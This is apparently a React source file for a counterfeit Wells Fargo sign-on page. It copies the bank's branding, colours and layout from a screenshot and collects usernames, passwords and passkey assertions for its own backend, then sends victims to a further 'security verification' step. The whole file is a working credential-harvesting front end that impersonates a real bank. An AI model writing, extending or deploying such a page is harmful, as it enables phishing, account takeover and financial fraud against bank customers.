import { useState } from "react";
import { useForm } from "react-hook-form";
import { useMutation } from "@tanstack/react-query";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import { Search } from "lucide-react";
import { Link, useLocation } from "wouter";
import { OfficialFooter } from "@/components/official-footer";
import wfBg from "@assets/IMG_3610_1774119228553.jpeg";

type LoginFormData = {
  username: string;
  password: string;
};

function getGreeting() {
  const hour = new Date().getHours();
  if (hour < 12) return "Good morning";
  if (hour < 17) return "Good afternoon";
  return "Good evening";
}

export default function LoginPage() {
  const [showPassword, setShowPassword] = useState(false);
  const [saveUsername, setSaveUsername] = useState(false);
  const [greeting] = useState(getGreeting());
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const [biometricLoading, setBiometricLoading] = useState(false);
  const [usernameValue, setUsernameValue] = useState("");

  const handleBiometricLogin = async () => {
    setBiometricLoading(true);
    try {
      const challengeRes = await fetch("/api/auth/biometric/challenge", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "authenticate" }),
      });
      if (!challengeRes.ok) throw new Error("Failed to get challenge");
      const { challenge, rpId, allowCredentials } = await challengeRes.json();
      const credential = await navigator.credentials.get({
        publicKey: {
          challenge: Uint8Array.from(atob(challenge), c => c.charCodeAt(0)),
          rpId: rpId || window.location.hostname,
          allowCredentials: allowCredentials?.map((id: string) => ({
            id: Uint8Array.from(atob(id), c => c.charCodeAt(0)),
            type: "public-key" as const,
            transports: ["internal", "hybrid"] as AuthenticatorTransport[],
          })) || [],
          userVerification: "required",
          timeout: 120000,
        },
      }) as PublicKeyCredential;
      if (credential) {
        const authenticatorResponse = credential.response as AuthenticatorAssertionResponse;
        const authData = new Uint8Array(authenticatorResponse.authenticatorData);
        const flags = authData[32];
        const userVerified = (flags & 0x04) !== 0;
        const userPresent = (flags & 0x01) !== 0;
        const authRes = await fetch("/api/auth/biometric/authenticate", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            credentialId: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(credential.rawId)))),
            signature: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(authenticatorResponse.signature)))),
            authenticatorData: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(authenticatorResponse.authenticatorData)))),
            clientDataJSON: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(credential.response.clientDataJSON)))),
            biometricType: "facial_recognition",
            userVerified,
            userPresent,
            credentialType: credential.type,
            authenticatorAttachment: (credential as any).authenticatorAttachment || "platform",
          }),
        });
        if (authRes.ok) {
          const authDataResponse = await authRes.json();
          toast({ title: "Face ID Sign On Successful", description: "Please complete security verification..." });
          sessionStorage.setItem("loginUsername", authDataResponse.user?.id || "biometric_user");
          setLocation("/verify");
        } else {
          throw new Error("Biometric authentication failed");
        }
      }
    } catch (error: any) {
      console.log("Face ID not available or cancelled");
    } finally {
      setBiometricLoading(false);
    }
  };

  const form = useForm<LoginFormData>({ defaultValues: { username: "", password: "" } });

  const loginMutation = useMutation({
    mutationFn: async (data: LoginFormData) => {
      const response = await apiRequest("POST", "/api/auth/login", { username: data.username, password: data.password });
      const result = await response.json();
      return { ...result, username: data.username };
    },
    onSuccess: (data) => {
      sessionStorage.setItem("loginUsername", data.username);
      toast({ title: "Sign On Successful", description: "Please complete security verification..." });
      setLocation("/verify");
    },
    onError: (error: Error) => {
      toast({ title: "Sign On Failed", description: error.message || "Invalid username or password", variant: "destructive" });
    },
  });

  const onSubmit = (data: LoginFormData) => loginMutation.mutate(data);

  const LoginCard = ({ isDesktop = false }: { isDesktop?: boolean }) => (
    <div
      className="rounded-2xl shadow-2xl"
      style={{
        width: isDesktop ? 420 : "100%",
        padding: isDesktop ? "40px 44px" : "28px 18px 40px",
        backgroundColor: "#ffffff",
      }}
    >
      <h2
        className="font-normal text-[#111] text-center leading-none mb-7"
        style={{
          fontFamily: "Georgia, 'Times New Roman', serif",
          fontSize: isDesktop ? 34 : 32,
        }}
        data-testid="text-greeting"
      >
        {greeting}
      </h2>

      <form onSubmit={form.handleSubmit(onSubmit)}>
        {/* Username field */}
        <div className="mb-[10px] relative">
          <input
            {...form.register("username", { required: true })}
            placeholder="Username"
            autoComplete="username"
            autoCapitalize="off"
            autoCorrect="off"
            spellCheck={false}
            onChange={(e) => {
              form.setValue("username", e.target.value);
              setUsernameValue(e.target.value);
            }}
            className="w-full text-[16px] text-gray-800 placeholder-gray-400 bg-white rounded-[12px] focus:outline-none"
            style={{
              height: 56,
              padding: "0 44px 0 14px",
              border: "1.5px solid #c8c8c8",
            }}
            data-testid="input-username"
          />
          {usernameValue && (
            <button
              type="button"
              onMouseDown={(e) => e.preventDefault()}
              onClick={() => { form.setValue("username", ""); setUsernameValue(""); }}
              className="absolute right-[12px] top-1/2 -translate-y-1/2"
              data-testid="button-clear-username"
            >
              <svg viewBox="0 0 20 20" width="20" height="20" fill="none">
                <circle cx="10" cy="10" r="9" stroke="#aaa" strokeWidth="1.5" />
                <path d="M7 7l6 6M13 7l-6 6" stroke="#aaa" strokeWidth="1.5" strokeLinecap="round" />
              </svg>
            </button>
          )}
        </div>

        {/* Password field */}
        <div className="mb-[14px] relative">
          <input
            {...form.register("password", { required: true })}
            type={showPassword ? "text" : "password"}
            placeholder="Password"
            autoComplete="current-password"
            className="w-full text-[16px] text-gray-800 placeholder-gray-400 bg-white rounded-[12px] focus:outline-none"
            style={{
              height: 56,
              padding: "0 56px 0 14px",
              border: "1.5px solid #c8c8c8",
            }}
            data-testid="input-password"
          />
          <button
            type="button"
            onMouseDown={(e) => e.preventDefault()}
            onClick={() => setShowPassword(!showPassword)}
            className="absolute right-[14px] top-1/2 -translate-y-1/2 text-[#4338ca] text-[15px] font-medium"
            data-testid="button-toggle-password"
          >
            {showPassword ? "Hide" : "Show"}
          </button>
        </div>

        {/* Save username */}
        <div className="flex items-center gap-[10px] mb-[8px]">
          <div
            className="w-[18px] h-[18px] flex-shrink-0 border border-gray-500 flex items-center justify-center cursor-pointer bg-white"
            style={{ borderRadius: 3 }}
            onClick={() => setSaveUsername(!saveUsername)}
            data-testid="checkbox-save-username"
          >
            {saveUsername && (
              <svg viewBox="0 0 12 12" className="w-3 h-3" fill="none">
                <path d="M2 6l3 3 5-5" stroke="#333" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
            )}
          </div>
          <label className="text-[15px] text-gray-800 cursor-pointer select-none" onClick={() => setSaveUsername(!saveUsername)}>
            Save username
          </label>
        </div>

        {/* Security text */}
        <p className="text-[12.5px] text-gray-500 leading-[1.45] mb-[28px]">
          To help keep your account secure, save your username only on devices that aren't used by other people.
        </p>

        {/* Sign on button */}
        <div className="flex justify-center mb-[14px]">
          <button
            type="submit"
            disabled={loginMutation.isPending}
            className="rounded-full text-[16px] font-medium transition-colors disabled:opacity-60"
            style={{ height: 50, width: 220, backgroundColor: "#d0d0d0", color: "#888" }}
            data-testid="button-sign-on"
          >
            {loginMutation.isPending ? "Signing on…" : "Sign on"}
          </button>
        </div>
      </form>

      <p className="text-center text-[14px] text-gray-600 mb-[14px]">or</p>

      {/* Passkey button */}
      <div className="flex justify-center mb-[14px]">
        <button
          type="button"
          onClick={handleBiometricLogin}
          disabled={biometricLoading}
          className="rounded-full bg-white text-[15px] font-medium text-gray-900 flex items-center justify-center gap-[7px] hover:bg-gray-50 transition-colors disabled:opacity-60"
          style={{ height: 50, width: 220, border: "1.5px solid #222" }}
          data-testid="button-passkey"
        >
          <svg viewBox="0 0 20 20" width="19" height="19" fill="none" aria-hidden="true">
            <circle cx="8" cy="6" r="3.5" stroke="#333" strokeWidth="1.4" />
            <path d="M1.5 17c0-3.3 2.9-6 6.5-6" stroke="#333" strokeWidth="1.4" strokeLinecap="round" />
            <circle cx="15" cy="13.5" r="2.5" stroke="#333" strokeWidth="1.4" />
            <path d="M17 15l1.5 1.5M18.5 15.5L17 17" stroke="#333" strokeWidth="1.3" strokeLinecap="round" />
            <circle cx="15" cy="13.5" r="0.8" fill="#333" />
          </svg>
          {biometricLoading ? "Authenticating…" : "Use a passkey"}
        </button>
      </div>

      <p className="text-[12.5px] text-gray-600 leading-[1.45] mb-[36px]">
        Don't have one? Create a passkey after signing on and skip the password next time.
      </p>

      <div className="flex items-center justify-center gap-[5px]">
        <span className="text-[#4b3f9e] text-[15px]">→</span>
        <Link href="/forgot-password" className="text-[#4b3f9e] text-[15px] hover:underline" data-testid="link-forgot">
          Forgot username or password?
        </Link>
      </div>
    </div>
  );

  return (
    <>
      {/* ── DESKTOP LAYOUT ── */}
      <div
        className="hidden lg:flex flex-col min-h-screen"
        style={{
          backgroundImage: `url(${wfBg})`,
          backgroundSize: "cover",
          backgroundPosition: "center top",
          backgroundAttachment: "fixed",
        }}
      >

        {/* Header — Wells Fargo standard red matching screenshot */}
        <header style={{ backgroundColor: "#b01e22", flexShrink: 0 }}>
          <div className="px-6 flex items-center justify-between" style={{ height: 48 }}>
            <div
              className="text-white font-bold tracking-[0.14em]"
              style={{ fontFamily: "'Times New Roman', Georgia, serif", fontSize: 21 }}
            >
              WELLS FARGO
            </div>
            <div className="flex items-center gap-5 text-white" style={{ fontSize: 13 }}>
              <div className="flex items-center gap-1.5 cursor-pointer hover:underline">
                <svg viewBox="0 0 16 16" width="13" height="13" fill="none">
                  <rect x="3" y="7" width="10" height="8" rx="1.5" stroke="white" strokeWidth="1.4" />
                  <path d="M5.5 7V5a2.5 2.5 0 0 1 5 0v2" stroke="white" strokeWidth="1.4" strokeLinecap="round" />
                </svg>
                <Link href="/register" className="text-white hover:underline">Enroll</Link>
              </div>
              <span className="cursor-pointer hover:underline">Customer Service</span>
              <span className="cursor-pointer hover:underline">ATMs/Locations</span>
              <span className="cursor-pointer hover:underline">Español</span>
              {/* Search box — white box with search icon */}
              <div
                className="flex items-center justify-between bg-white cursor-pointer"
                style={{ height: 28, borderRadius: 3, padding: "0 8px 0 10px", gap: 6, minWidth: 80 }}
              >
                <span className="text-gray-400" style={{ fontSize: 12 }}>Search</span>
                <div
                  className="flex items-center justify-center rounded-sm"
                  style={{ width: 22, height: 22, backgroundColor: "#b01e22" }}
                >
                  <Search className="text-white" style={{ width: 12, height: 12 }} />
                </div>
              </div>
            </div>
          </div>
        </header>

        {/* Content area — scrollable, card centered */}
        <div
          className="flex-1 flex items-center justify-center"
          style={{ minHeight: "calc(100vh - 48px)", padding: "40px 0" }}
        >
          <LoginCard isDesktop={true} />
        </div>
      </div>

      {/* ── MOBILE LAYOUT ── */}
      <div className="lg:hidden min-h-screen flex flex-col bg-white">
        <header className="bg-[#d71e28] flex items-center px-4" style={{ height: 52 }}>
          <div className="flex-1" />
          <span
            className="text-white font-bold text-[17px] tracking-[0.16em]"
            style={{ fontFamily: "'Times New Roman', Georgia, serif" }}
          >
            WELLS FARGO
          </span>
          <div className="flex-1 flex justify-end">
            <button
              type="button"
              aria-label="Menu"
              data-testid="button-mobile-menu"
              className="flex flex-col justify-center gap-[5px] py-2"
            >
              <span className="block w-[22px] h-[2px] bg-white" />
              <span className="block w-[22px] h-[2px] bg-white" />
              <span className="block w-[22px] h-[2px] bg-white" />
            </button>
          </div>
        </header>
        <div className="h-[3px] bg-[#ffcd41]" />
        <main className="flex-1 bg-white overflow-y-auto">
          <div className="px-[18px] pt-7 pb-10">
            <LoginCard isDesktop={false} />
          </div>
        </main>
        <OfficialFooter />
      </div>
    </>
  );
}
